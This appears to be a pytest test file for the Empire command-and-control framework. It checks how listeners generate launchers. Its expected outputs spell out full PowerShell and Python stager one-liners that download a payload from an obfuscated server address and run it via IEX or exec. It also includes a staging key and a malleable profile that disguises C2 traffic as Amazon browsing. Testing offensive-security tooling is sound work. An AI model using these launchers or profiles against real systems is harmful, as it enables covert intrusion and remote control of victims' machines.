import base64
import json
from pathlib import Path
from textwrap import dedent
from unittest.mock import MagicMock, Mock

import pytest

from empire.server.common import helpers


@pytest.fixture(scope="module", autouse=True)
def _setup_staging_key(session_local, models):
    with session_local.begin() as db:
        config = db.query(models.Config).first()
        config.staging_key = "@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}"


@pytest.fixture
def main_menu_mock(models):
    main_menu = Mock()
    main_menu.install_path = Path()
    main_menu.listeners.activeListeners = {}
    main_menu.listeners.listeners = {}
    return main_menu


def test_http_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http.secrets", secrets_mock)

    http_listener = Listener(main_menu_mock)

    http_listener.options["Cookie"]["Value"] = "l33th4x0r"
    http_listener.options["Host"]["Value"] = "http://localhost"
    http_listener.options["Port"]["Value"] = "80"
    http_listener.host_address = "http://localhost/"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_listener.options}
    }

    http_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_python_launcher()

    powershell_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_powershell_launcher()


def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_foreign import Listener

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_foreign.secrets", secrets_mock)

    http_foreign_listener = Listener(main_menu_mock)

    http_foreign_listener.options["Host"]["Value"] = "http://localhost"
    http_foreign_listener.options["Port"]["Value"] = "80"
    http_foreign_listener.options["RoutingPacket"]["Value"] = "cm91dGluZyBwYWNrZXQ="
    http_foreign_listener.host_address = "http://localhost/"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_foreign_listener.options}
    }

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    http_foreign_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_foreign_python_launcher()

    powershell_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_foreign_powershell_launcher()


def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_hop import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_hop.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_hop.secrets", secrets_mock)

    http_hop_listener = Listener(main_menu_mock)

    http_hop_listener.options["Host"]["Value"] = "http://localhost"
    http_hop_listener.options["Port"]["Value"] = "80"
    http_hop_listener.host_address = "http://localhost/"
    http_hop_listener.options["DefaultProfile"]["Value"] = (
        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    )
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_hop_listener.options}
    }
    http_hop_listener.session_cookie = "session"

    # create listenersv2 mock and set both methods on the SAME instance
    listenersv2 = MagicMock()
    listenersv2.get_active_listener_by_name.return_value = http_hop_listener
    listenersv2.validate_listener_address.return_value = ("http://localhost/", None)

    # attach to main_menu_mock
    main_menu_mock.listenersv2 = listenersv2

    http_hop_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_hop_python_launcher()

    powershell_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_hop_powershell_launcher()


def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_malleable import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_malleable.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_malleable.secrets", secrets_mock)

    helpers_mock = MagicMock()
    helpers_mock.random_string.return_value = "r"
    monkeypatch.setattr("empire.server.listeners.http_malleable.helpers", helpers_mock)
    helpers_mock.obfuscate_call_home_address.side_effect = (
        helpers.obfuscate_call_home_address
    )

    session_mock = MagicMock()
    profile_mock = MagicMock()
    session_mock.return_value.query.return_value.filter.return_value.first.return_value = profile_mock
    profile_mock.data = _fake_malleable_profile()
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.SessionLocal", session_mock
    )

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    http_malleable_listener = Listener(main_menu_mock)
    http_malleable_listener.options["Profile"]["Value"] = "amazon.profile"
    http_malleable_listener.validate_options()

    http_malleable_listener.options["Host"]["Value"] = "http://localhost"
    http_malleable_listener.options["Port"]["Value"] = "80"

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_malleable_listener.options}
    }

    http_malleable_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_malleable_python_launcher()

    powershell_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_malleable_powershell_launcher()


def _build_malleable_listener(monkeypatch, main_menu_mock):
    """Construct a validated malleable listener with the amazon sample
    profile. Mirrors the setup in test_http_malleable_generate_launcher
    but returns the listener for reuse."""
    from empire.server.listeners.http_malleable import Listener

    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_malleable.packets", packets)

    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_malleable.secrets", secrets_mock)

    helpers_mock = MagicMock()
    helpers_mock.random_string.return_value = "r"
    monkeypatch.setattr("empire.server.listeners.http_malleable.helpers", helpers_mock)
    helpers_mock.obfuscate_call_home_address.side_effect = (
        helpers.obfuscate_call_home_address
    )

    session_mock = MagicMock()
    profile_mock = MagicMock()
    session_mock.return_value.query.return_value.filter.return_value.first.return_value = profile_mock
    profile_mock.data = _fake_malleable_profile()
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.SessionLocal", session_mock
    )

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    listener = Listener(main_menu_mock)
    listener.options["Profile"]["Value"] = "amazon.profile"
    listener.validate_options()
    listener.options["Host"]["Value"] = "http://localhost"
    listener.options["Port"]["Value"] = "80"

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": listener.options}
    }
    listener.threads = {"fake_listener": {"fake_thread": {}}}
    return listener


def _assert_valid_malleable_profile_b64(b64: str):
    """Decode + JSON-parse the base64 blob; assert v1 schema with all
    three sections. Shared by csharp and go tests."""
    assert b64, "MALLEABLE_PROFILE must not be empty for malleable listener"
    decoded = base64.b64decode(b64).decode("utf-8")
    payload = json.loads(decoded)
    assert payload["v"] == 1
    assert set(payload["sections"].keys()) == {"stager", "get", "post"}
    for section_name in ("stager", "get", "post"):
        assert "client" in payload["sections"][section_name]
        assert "server" in payload["sections"][section_name]


def test_http_malleable_generate_launcher_csharp(monkeypatch, main_menu_mock):
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    compile_mock = MagicMock(return_value="/tmp/sharpire-build.exe")
    main_menu_mock.dotnet_compiler.compile_stager = compile_mock

    result = listener.generate_launcher(
        listener_name="fake_listener", language="csharp", encode=False
    )

    assert result == "/tmp/sharpire-build.exe"
    compile_mock.assert_called_once()
    stager_yaml = compile_mock.call_args[0][0]

    # Malleable path must read SharpireMalleable.yaml and pass the
    # "SharpireMalleable" stager name so EmpireCompiler globs BOTH source
    # libraries (base Sharpire + SharpireMalleable extension) into the build.
    assert compile_mock.call_args[0][1] == "SharpireMalleable"
    assert "Name: SharpireMalleable" in stager_yaml

    assert "{{ REPLACE_MALLEABLE_PROFILE }}" not in stager_yaml
    assert "SetMalleableProfile" in stager_yaml
    # Syntactic anchor for EmpireCompiler's tree-pruning optimizer — without
    # explicit typeof() references the optimizer drops MalleableProfile.cs /
    # MalleableTransform.cs from the second compile pass (partial classes
    # split across source libraries confuse DeclaringSyntaxReferences).
    assert "typeof(MalleableProfile)" in stager_yaml
    assert "typeof(MalleableTransform)" in stager_yaml

    match = None
    for line in stager_yaml.splitlines():
        if "malleableProfileB64" in line and "=" in line:
            match = line.split('"')[1]
            break
    assert match is not None, "could not find substituted malleableProfileB64"
    _assert_valid_malleable_profile_b64(match)


def test_http_malleable_generate_launcher_go(monkeypatch, main_menu_mock):
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    go_compile_mock = MagicMock(return_value="/tmp/gopire-build.exe")
    main_menu_mock.stagergenv2.generate_go_stageless = go_compile_mock

    result = listener.generate_launcher(
        listener_name="fake_listener", language="go", encode=False
    )

    assert result == "/tmp/gopire-build.exe"
    go_compile_mock.assert_called_once()


def test_http_malleable_serialize_profile_for_agent(monkeypatch, main_menu_mock):
    """The Listener.serialize_profile_for_agent helper should emit a
    base64-encoded JSON blob that matches the v1 schema the agents
    parse. This is the contract both Sharpire and Gopire rely on."""
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    b64 = listener.serialize_profile_for_agent()
    _assert_valid_malleable_profile_b64(b64)


def test_http_generate_launcher_csharp_plain_ships_without_malleable(
    monkeypatch, main_menu_mock
):
    """Plain http listener builds base Sharpire — no malleable types, no
    SetMalleableProfile call, no System.Web.Extensions reference. The
    malleable pipeline is exclusive to http_malleable's SharpireMalleable
    yaml, which pulls the extension library in as a second
    ReferenceSourceLibrary."""
    from empire.server.listeners.http import Listener

    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"

    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http.packets", packets)

    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http.secrets", secrets_mock)

    http_listener = Listener(main_menu_mock)
    http_listener.options["Host"]["Value"] = "http://localhost"
    http_listener.options["Port"]["Value"] = "80"
    http_listener.host_address = "http://localhost/"

    compile_mock = MagicMock(return_value="/tmp/plain-sharpire.exe")
    main_menu_mock.dotnet_compiler.compile_stager = compile_mock

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_listener.options}
    }
    http_listener.threads = {"fake_listener": {"fake_thread": {}}}

    result = http_listener.generate_launcher(
        listener_name="fake_listener", language="csharp", encode=False
    )

    assert result == "/tmp/plain-sharpire.exe"
    assert compile_mock.call_args[0][1] == "Sharpire"
    stager_yaml = compile_mock.call_args[0][0]
    assert "malleableProfileB64" not in stager_yaml
    assert "SetMalleableProfile" not in stager_yaml
    assert "REPLACE_MALLEABLE_PROFILE" not in stager_yaml
    assert "SharpireMalleable" not in stager_yaml
    # System.Web.Extensions lives only on SharpireMalleable so plain builds
    # shouldn't pull it in as a reference assembly.
    assert "System.Web.Extensions" not in stager_yaml


def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http import Listener as HttpListener
    from empire.server.listeners.port_forward_pivot import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.port_forward_pivot.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.port_forward_pivot.secrets", secrets_mock
    )

    port_forward_pivot = Listener(main_menu_mock)

    # redirector doesn't get these fields until the listener is started.
    port_forward_pivot.options.update(HttpListener(main_menu_mock).options)
    port_forward_pivot.options["Host"] = {"Value": "http://localhost"}
    port_forward_pivot.options["Port"] = {"Value": "80"}
    port_forward_pivot.host_address = "http://localhost/"

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": port_forward_pivot.options}
    }

    port_forward_pivot.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_redirector_python_launcher()

    powershell_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_redirector_powershell_launcher()


def _expected_http_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(\'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}\');$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';
        req=urllib.request.Request(server+t);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "l33th4x0r=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
        """
    ).strip("\n")


def _expected_http_foreign_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_foreign_python_launcher():
    return dedent(
        """
        import sys;
        o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
        server='http://localhost/';t='/admin/get.php';
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        import urllib.request;
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        data=o.open(server+t).read();
        exec(data);
        """
    ).strip("\n")


def _expected_http_hop_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';hop='fake_listener';
        req=urllib.request.Request(server+t);
        req.add_header('Hop-Name', hop);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_http_hop_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_malleable_python_launcher():
    return dedent(
        """
        import sys,base64
        import urllib.request,urllib.parse
        server='http://localhost/'
        proxy = urllib.request.ProxyHandler()
        o = urllib.request.build_opener(proxy)
        urllib.request.install_opener(o)
        vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
        req=vreq('http://localhost:80/init/', )
        req.verb='GET'
        req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
        req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
        res=urllib.request.urlopen(req)
        data=res.read()
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_http_malleable_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/init/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _fake_malleable_profile():
    return """
        #
        # Amazon browsing traffic profile
        #
        # Author: @harmj0y
        #

        set sleeptime "5000";
        set jitter    "0";
        set maxdns    "255";
        set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

        http-get {

            set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

            client {

                header "Accept" "*/*";
                header "Host" "www.amazon.com";

                metadata {
                    base64;
                    prepend "session-token=";
                    prepend "skin=noskin;";
                    append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
                    header "Cookie";
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
                header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "Content-Encoding" "gzip";

                output {
                    print;
                }
            }
        }

        http-post {

            set uri "/N4215/adj/amzn.us.sr.aps";

            client {

                header "Accept" "*/*";
                header "Content-Type" "text/xml";
                header "X-Requested-With" "XMLHttpRequest";
                header "Host" "www.amazon.com";

                parameter "sz" "160x600";
                parameter "oe" "oe=ISO-8859-1;";

                id {
                    parameter "sn";
                }

                parameter "s" "3717";
                parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

                output {
                    base64;
                    print;
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
                header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "x-ua-compatible" "IE=edge";

                output {
                    print;
                }
            }
        }
     """


def _expected_redirector_python_launcher():
    return dedent(
        """
        import sys;import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';req=urllib.request.Request(server+t);
        req.add_header('User-Agent',UA);
        req.add_header('Cookie',"session=cm91dGluZyBwYWNrZXQ=");
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_redirector_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
